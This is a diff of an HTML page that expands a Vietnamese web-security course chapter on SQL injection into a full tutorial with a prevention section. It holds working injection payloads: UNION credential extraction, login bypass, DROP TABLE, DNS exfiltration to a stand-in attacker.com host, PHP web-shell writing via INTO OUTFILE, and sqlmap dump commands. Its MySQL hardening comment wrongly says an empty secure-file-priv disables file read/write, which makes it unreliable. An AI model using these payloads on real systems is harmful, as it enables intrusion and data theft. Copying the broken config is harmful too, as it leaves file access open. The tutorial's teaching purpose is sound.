@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 12: SQL Injection — Hieu Nguyen</title>
-  <meta name="description" content="SQLi khái niệm, parameterized queries, least privilege, WAF phụ.">
+  <meta name="description" content="Chương 12: SQL Injection — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,62 +40,400 @@
         <span>›</span>
         <span>12. SQLi</span>
       </div>
-      <h1>Chương 12: SQL Injection</h1>
-      <p class="lede">String SQL cộng với input user. Database làm đúng những gì bạn vô tình viết.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> IV — Injection</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>SQL injection: input trở thành câu lệnh. Lớp: error-based, UNION, boolean/time blind, second-order (lưu rồi query sau). Chi tiết kỹ thuật khai thác để học trên lab được phép (PortSwigger), không đem ra hệ thống thật.</p>
-<h2 id="phong">Phòng chống</h2>
-<ol>
-        <li>Parameterized queries / bind variables — control chính.</li>
-        <li>ORM đúng cách (không raw concat).</li>
-        <li>DB user least privilege: app không cần FILE / DBA.</li>
-        <li>Input allowlist khi dynamic identifier (ORDER BY cột) — không nhét raw vào identifier.</li>
-        <li>WAF: lớp phụ.</li>
-      </ol>
-<h2 id="phat-hien">Cách phát hiện</h2>
-<p>SAST, code review concat SQL, error DB lộ trên staging, DAST trên lab. Production: không hiện SQL error cho client.</p>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Secret DB không admin. NetworkPolicy: chỉ app subnet tới 5432. Log slow query, không log full bound params nếu có PII. Image không ship CLI dump lung tung.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Bind parameters.</li>
-        <li>Ít quyền DB.</li>
-        <li>Ẩn lỗi SQL.</li>
-        <li>WAF không thay code.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Vì sao escape tay kém prepared statement?</li>
-        <li>Second-order là gì?</li>
-        <li>App role DB nên thiếu quyền nào?</li>
-        <li>ORM vẫn SQLi khi nào?</li>
-        <li>Hiện stack SQL trên 500 page hại gì?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 12: SQL Injection</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>SQL Injection</strong> (Tiêm SQL) là lỗ hổng cho phép hacker can thiệp vào database queries của ứng dụng bằng cách inject SQL code vào user input.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Rất cao — SQLi có thể dẫn đến đọc/sửa/xóa toàn bộ database, bypass authentication, và trong một số trường hợp, RCE (Remote Code Execution).</p>
+<p>SQLi xảy ra khi user input được nối trực tiếp vào SQL query thay vì dùng parameterized queries.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-python"># Vulnerable code
+def get_products(category):
+    query = f&quot;SELECT * FROM products WHERE category = &#x27;{category}&#x27;&quot;
+    return db.execute(query)
 
-      <div class="docs-tags">
-        <span class="docs-tag">sqli</span>
-        <span class="docs-tag">injection</span>
-        <span class="docs-tag">owasp</span>
-      </div>
+# Normal request: category=Gifts
+# Query: SELECT * FROM products WHERE category = &#x27;Gifts&#x27;
+
+# Attack: category=Gifts&#x27; OR &#x27;1&#x27;=&#x27;1
+# Query: SELECT * FROM products WHERE category = &#x27;Gifts&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;
+# → Return tất cả products (vì &#x27;1&#x27;=&#x27;1&#x27; luôn true)
+</code></pre>
+<hr>
+<h2 id="các-loại-sql-injection">Các loại SQL Injection</h2>
+<h3 id="1-in-band-sqli--error-based">1. In-Band SQLi — Error-Based</h3>
+<p>Server trả về SQL error messages → leak thông tin database structure.</p>
+<pre><code class="language-text">Input: &#x27; (single quote)
+Error: You have an error in your SQL syntax; check the manual that corresponds 
+       to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1
+
+→ Biết đây là MySQL, biết query syntax
+</code></pre>
+<p><strong>Khai thác error-based:</strong></p>
+<pre><code class="language-sql">-- MySQL: extractvalue để trigger error chứa data
+&#x27; AND extractvalue(1, concat(0x7e, (SELECT version()))) --
+
+-- Error: XPATH syntax error: &#x27;~5.7.32-log&#x27;
+-- → Biết MySQL version là 5.7.32
+
+-- Lấy database names
+&#x27; AND extractvalue(1, concat(0x7e, (SELECT database()))) --
+-- Error: XPATH syntax error: &#x27;~shopdb&#x27;
+
+-- Lấy table names
+&#x27; AND extractvalue(1, concat(0x7e, 
+  (SELECT table_name FROM information_schema.tables 
+   WHERE table_schema=database() LIMIT 0,1))) --
+</code></pre>
+<h3 id="2-in-band-sqli--union-based">2. In-Band SQLi — UNION-Based</h3>
+<p>Dùng UNION để nối kết quả từ query khác vào response.</p>
+<pre><code class="language-sql">-- Bước 1: Tìm số cột
+&#x27; ORDER BY 1--    → OK
+&#x27; ORDER BY 2--    → OK  
+&#x27; ORDER BY 3--    → Error → có 2 cột
+
+-- Bước 2: Tìm cột nào hiển thị text
+&#x27; UNION SELECT NULL, NULL--
+&#x27; UNION SELECT &#x27;test&#x27;, NULL--    → &#x27;test&#x27; xuất hiện → cột 1 hiển thị text
+
+-- Bước 3: Extract data
+&#x27; UNION SELECT username, password FROM users--
+&#x27; UNION SELECT table_name, column_name FROM information_schema.columns--
+</code></pre>
+<p><strong>Ví dụ đầy đủ:</strong></p>
+<pre><code class="language-http">GET /products?category=Gifts&#x27; UNION SELECT username, password FROM users-- HTTP/1.1
+
+Response:
+Product: admin | Password: admin123
+Product: alice | Password: letmein
+</code></pre>
+<h3 id="3-blind-sqli--boolean-based">3. Blind SQLi — Boolean-Based</h3>
+<p>App không hiển thị kết quả query, nhưng hành vi khác nhau dựa trên condition true/false.</p>
+<pre><code class="language-sql">-- Test: nếu điều kiện đúng → trả 1 product, sai → trả 0 product
+&#x27; AND 1=1--           → kết quả bình thường (true)
+&#x27; AND 1=2--           → không có kết quả (false)
+
+-- Lấy thông tin từng ký tự
+&#x27; AND SUBSTRING(username,1,1)=&#x27;a&#x27;-- → true nếu char đầu là &#x27;a&#x27;
+&#x27; AND SUBSTRING(username,1,1)=&#x27;b&#x27;-- → false
+
+-- Automation: brute force từng ký tự
+&#x27; AND ASCII(SUBSTRING((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1))&gt;50--
+→ Binary search để tìm ASCII value
+</code></pre>
+<h3 id="4-blind-sqli--time-based">4. Blind SQLi — Time-Based</h3>
+<p>Không có sự khác biệt trong response — dùng time delay để infer data.</p>
+<pre><code class="language-sql">-- MySQL
+&#x27; AND SLEEP(5)--
+-- Nếu delay 5 giây → query thực thi → SQLi confirmed
+
+&#x27; AND IF(1=1, SLEEP(5), 0)--     → delay (true)
+&#x27; AND IF(1=2, SLEEP(5), 0)--     → không delay (false)
+
+-- Lấy data qua timing
+&#x27; AND IF(SUBSTRING(database(),1,1)=&#x27;s&#x27;, SLEEP(3), 0)--
+→ Delay 3 giây → ký tự đầu của database name là &#x27;s&#x27;
+
+-- PostgreSQL
+&#x27;; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- MSSQL
+&#x27;; IF (1=1) WAITFOR DELAY &#x27;0:0:5&#x27;--
+</code></pre>
+<h3 id="5-out-of-band-sqli">5. Out-of-Band SQLi</h3>
+<p>Khi server không trả về gì cả, dùng DNS/HTTP để exfiltrate data ra ngoài.</p>
+<pre><code class="language-sql">-- MySQL: dùng load_file để trigger DNS
+&#x27; AND LOAD_FILE(concat(&#x27;\\\\&#x27;, database(), &#x27;.attacker.com\\a&#x27;))--
+→ DNS lookup: shopdb.attacker.com → biết database name
+
+-- MSSQL: xp_cmdshell (nếu enabled)
+&#x27;; exec master..xp_cmdshell &#x27;nslookup &#x27;+@@version+&#x27;.attacker.com&#x27;--
+</code></pre>
+<h3 id="6-second-order-injection">6. Second-Order Injection</h3>
+<p>Payload được lưu vào DB, sau đó được dùng unsafe trong query khác.</p>
+<pre><code class="language-python"># Bước 1: Register user với username có payload
+username = &quot;admin&#x27;--&quot;
+# Lưu vào DB: developer nghĩ đã safe vì escaped khi lưu
+
+# Bước 2: Khi change password, dùng stored username trực tiếp
+query = f&quot;UPDATE users SET password=&#x27;{new_pass}&#x27; WHERE username=&#x27;{current_username}&#x27;&quot;
+# current_username = admin&#x27;-- (lấy từ DB, không escape lại)
+# Query: UPDATE users SET password=&#x27;...&#x27; WHERE username=&#x27;admin&#x27;--&#x27;
+# → Đổi password của admin, không phải current user
+</code></pre>
+<hr>
+<h2 id="khai-thác-nâng-cao">Khai thác nâng cao</h2>
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+<pre><code class="language-sql">-- Login form
+SELECT * FROM users WHERE username=&#x27;INPUT&#x27; AND password=&#x27;INPUT&#x27;
+
+-- Payload username: admin&#x27;--
+-- Query: SELECT * FROM users WHERE username=&#x27;admin&#x27;--&#x27; AND password=&#x27;anything&#x27;
+-- → Comment out password check → login as admin without password
+
+-- Payload: &#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--
+-- Query: SELECT * FROM users WHERE username=&#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&#x27; AND password=&#x27;&#x27;
+-- → Return tất cả users, login với user đầu tiên (thường là admin)
+</code></pre>
+<h3 id="stacked-queries-nếu-db-support">Stacked Queries (Nếu DB support)</h3>
+<pre><code class="language-sql">-- PostgreSQL, MSSQL support multiple statements
+&#x27;; DROP TABLE users; --
+&#x27;; INSERT INTO admin_users VALUES (&#x27;hacker&#x27;,&#x27;password&#x27;); --
+
+-- MySQL không support stacked queries qua standard PHP/Python drivers
+</code></pre>
+<h3 id="file-readwrite">File Read/Write</h3>
+<pre><code class="language-sql">-- MySQL: đọc file (cần FILE privilege)
+&#x27; UNION SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;), NULL--
+
+-- MySQL: ghi web shell (cần quyền ghi vào webroot)
+&#x27; UNION SELECT &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;, NULL 
+  INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;--
+
+-- Bây giờ có RCE:
+-- https://example.com/shell.php?cmd=id
+</code></pre>
+<hr>
+<h2 id="sqlmap--automation-tool">sqlmap — Automation Tool</h2>
+<pre><code class="language-bash"># Basic scan
+sqlmap -u &quot;https://example.com/products?category=Gifts&quot;
+
+# Với cookies (authenticated)
+sqlmap -u &quot;https://example.com/api/products?id=1&quot; \
+       --cookie=&quot;session=abc123&quot;
+
+# POST request
+sqlmap -u &quot;https://example.com/login&quot; \
+       --data=&quot;username=admin&amp;password=test&quot; \
+       --method POST
+
+# Dump database
+sqlmap -u &quot;URL&quot; --dump-all
+
+# Detect specific DBMS
+sqlmap -u &quot;URL&quot; --dbms=mysql
+
+# Bypass WAF
+sqlmap -u &quot;URL&quot; --tamper=randomcase,space2comment
+
+# Chỉ test, không exploit
+sqlmap -u &quot;URL&quot; --batch --level=3 --risk=2
+</code></pre>
+<hr>
+<h2 id="database-specific-cheat-sheet">Database-Specific Cheat Sheet</h2>
+<pre><code class="language-sql">-- Lấy database version
+MySQL:      SELECT version()
+PostgreSQL: SELECT version()
+MSSQL:      SELECT @@version
+Oracle:     SELECT banner FROM v$version
+
+-- Lấy current database/schema
+MySQL:      SELECT database()
+PostgreSQL: SELECT current_database()
+MSSQL:      SELECT db_name()
+
+-- Lấy tất cả tables
+MySQL:      SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+PostgreSQL: SELECT tablename FROM pg_tables WHERE schemaname=&#x27;public&#x27;
+MSSQL:      SELECT table_name FROM information_schema.tables
+Oracle:     SELECT table_name FROM all_tables
+
+-- Comment syntax
+MySQL:      -- comment   # comment   /* comment */
+PostgreSQL: -- comment   /* comment */
+MSSQL:      -- comment   /* comment */
+Oracle:     -- comment   /* comment */
+
+-- String concatenation
+MySQL:      CONCAT(&#x27;a&#x27;,&#x27;b&#x27;) hoặc &#x27;a&#x27; &#x27;b&#x27;
+PostgreSQL: &#x27;a&#x27; || &#x27;b&#x27;
+MSSQL:      &#x27;a&#x27; + &#x27;b&#x27;
+Oracle:     &#x27;a&#x27; || &#x27;b&#x27;
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Thêm &#x27; (single quote) → SQL error xuất hiện?
+□ Thêm &#x27;&#x27; (double quote) → error changes?
+□ Boolean test: AND 1=1 vs AND 1=2 → response khác nhau?
+□ Time test: AND SLEEP(5) → delay?
+□ UNION test: UNION SELECT NULL--
+□ Error messages lộ database type/version?
+□ Response time bất thường với time-based payloads
+</code></pre>
+<p><strong>Burp Scanner</strong> tự động detect SQLi.</p>
+<p><strong>Manual test:</strong></p>
+<pre><code class="language-text">Input: &#x27;
+Input: &#x27;&#x27;
+Input: `
+Input: &#x27;)
+Input: &#x27;))
+Input: &#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--
+Input: &#x27; AND 1=2--
+Input: &#x27; UNION SELECT NULL--
+Input: &#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-parameterized-queries-quan-trọng-nhất">1. Parameterized Queries (Quan trọng nhất)</h3>
+<pre><code class="language-python"># SAI: String concatenation
+def login(username, password):
+    query = f&quot;SELECT * FROM users WHERE username=&#x27;{username}&#x27; AND password=&#x27;{password}&#x27;&quot;
+    return db.execute(query)
+
+# ĐÚNG: Parameterized query
+def login(username, password):
+    query = &quot;SELECT * FROM users WHERE username = %s AND password = %s&quot;
+    return db.execute(query, (username, password))
+
+# ĐÚNG với SQLAlchemy ORM
+from sqlalchemy import text
+def login(username, password):
+    result = db.execute(
+        text(&quot;SELECT * FROM users WHERE username = :user AND password = :pass&quot;),
+        {&quot;user&quot;: username, &quot;pass&quot;: password}
+    )
+    return result.fetchone()
+</code></pre>
+<pre><code class="language-python"># Với các ngôn ngữ khác:
+
+# PHP - PDO
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);
+$stmt-&gt;execute([$username, $password]);
+
+# Java - PreparedStatement
+String query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+
+# Node.js - mysql2
+const [rows] = await connection.execute(
+    &#x27;SELECT * FROM users WHERE username = ? AND password = ?&#x27;,
+    [username, password]
+);
+</code></pre>
+<h3 id="2-stored-procedures">2. Stored Procedures</h3>
+<pre><code class="language-sql">-- Stored procedure an toàn (nếu bên trong cũng dùng parameterized)
+CREATE PROCEDURE GetUser @username NVARCHAR(50), @password NVARCHAR(50)
+AS
+    SELECT * FROM users WHERE username = @username AND password = @password;
+GO
+</code></pre>
+<h3 id="3-least-privilege">3. Least Privilege</h3>
+<pre><code class="language-sql">-- DB user chỉ có quyền cần thiết
+CREATE USER &#x27;app_user&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;strong_password&#x27;;
+GRANT SELECT, INSERT, UPDATE ON mydb.users TO &#x27;app_user&#x27;@&#x27;%&#x27;;
+-- Không grant DROP, CREATE, FILE, SUPER
+</code></pre>
+<h3 id="4-input-validation-defense-in-depth">4. Input Validation (Defense in Depth)</h3>
+<pre><code class="language-python"># Validate trước khi query
+import re
+
+def validate_username(username):
+    if not re.match(r&#x27;^[a-zA-Z0-9_]{3,50}$&#x27;, username):
+        raise ValueError(&quot;Invalid username format&quot;)
+    return username
+</code></pre>
+<h3 id="5-waf-rules">5. WAF Rules</h3>
+<pre><code class="language-text">ModSecurity với OWASP CRS detect SQLi patterns:
+- Single quotes
+- SQL keywords (UNION, SELECT, DROP, etc.)
+- Comment sequences (--, #, /*)
+- Hex encoding bypass
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Database hardening:</strong></p>
+<pre><code class="language-yaml"># MySQL config: disable dangerous features
+[mysqld]
+local-infile = 0        # Disable LOAD DATA LOCAL INFILE
+secure-file-priv = &quot;&quot;   # Disable file read/write
+skip-show-database      # Hide database names
+
+# Restrict ho MySQL từ external access
+bind-address = 127.0.0.1  # Chỉ accept local connections
+</code></pre>
+<p><strong>Kubernetes: Database không expose ra ngoài:</strong></p>
+<pre><code class="language-yaml"># Database Service chỉ accessible trong cluster
+apiVersion: v1
+kind: Service
+metadata:
+  name: mysql
+spec:
+  type: ClusterIP  # Không phải NodePort hay LoadBalancer
+  ports:
+    - port: 3306
+</code></pre>
+<p><strong>SAST trong CI/CD để detect SQLi:</strong></p>
+<pre><code class="language-yaml"># GitHub Actions với Semgrep
+- name: SAST Scan
+  run: |
+    pip install semgrep
+    semgrep --config=p/sql-injection \
+            --config=p/owasp-top-ten \
+            src/
+</code></pre>
+<p><strong>Monitoring SQLi attempts:</strong></p>
+<pre><code class="language-text">Alert khi:
+- SQL error messages trong response (info leak)
+- Request với SQL keywords trong parameters
+- Unusual query patterns (UNION, OR 1=1)
+- High latency requests (time-based blind SQLi)
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>SQLi: inject SQL code vào query thay vì dùng parameterized queries.</li>
+<li>4 loại: Error-based, UNION-based, Blind (boolean/time), Out-of-band.</li>
+<li>Impact: data theft, auth bypass, file read/write, RCE.</li>
+<li>Phòng chống #1: Parameterized queries — không thể thiếu.</li>
+<li>Least privilege cho DB user — giới hạn damage nếu bị exploit.</li>
+<li>sqlmap là tool tự động hóa khai thác và detection.</li>
+<li>WAF có thể detect nhưng không nên là biện pháp duy nhất.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao UNION-based SQLi cần biết số cột trước khi khai thác?</li>
+<li>Sự khác nhau giữa boolean-based và time-based blind SQLi là gì?</li>
+<li>Second-order injection là gì và tại sao khó phát hiện hơn first-order?</li>
+<li>Parameterized queries ngăn SQLi như thế nào về mặt kỹ thuật?</li>
+<li>Nếu DB user bị compromise qua SQLi, tại sao principle of least privilege quan trọng?</li>
+</ol>
       <div class="docs-pager">
-        <a href="../11/">Previous · 11. XSS</a>
+        <a href="../22/">Previous · 22. Clickjacking</a>
         <a href="../13/">Next · 13. NoSQLi</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#phat-hien">Cách phát hiện</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#các-loại-sql-injection">Các loại SQL Injection</a>
+        <a class="depth-3" href="#1-in-band-sqli--error-based">1. In-Band SQLi — Error-Based</a>
+        <a class="depth-3" href="#2-in-band-sqli--union-based">2. In-Band SQLi — UNION-Based</a>
+        <a class="depth-3" href="#3-blind-sqli--boolean-based">3. Blind SQLi — Boolean-Based</a>
+        <a class="depth-3" href="#4-blind-sqli--time-based">4. Blind SQLi — Time-Based</a>
+        <a class="depth-3" href="#5-out-of-band-sqli">5. Out-of-Band SQLi</a>
+        <a class="depth-3" href="#6-second-order-injection">6. Second-Order Injection</a>
+        <a href="#khai-thác-nâng-cao">Khai thác nâng cao</a>
+        <a class="depth-3" href="#authentication-bypass">Authentication Bypass</a>
+        <a class="depth-3" href="#stacked-queries-nếu-db-support">Stacked Queries (Nếu DB support)</a>
+        <a class="depth-3" href="#file-readwrite">File Read/Write</a>
+        <a href="#sqlmap--automation-tool">sqlmap — Automation Tool</a>
+        <a href="#database-specific-cheat-sheet">Database-Specific Cheat Sheet</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-parameterized-queries-quan-trọng-nhất">1. Parameterized Queries (Quan trọng nhất)</a>
+        <a class="depth-3" href="#2-stored-procedures">2. Stored Procedures</a>
+        <a class="depth-3" href="#3-least-privilege">3. Least Privilege</a>
+        <a class="depth-3" href="#4-input-validation-defense-in-depth">4. Input Validation (Defense in Depth)</a>
+        <a class="depth-3" href="#5-waf-rules">5. WAF Rules</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
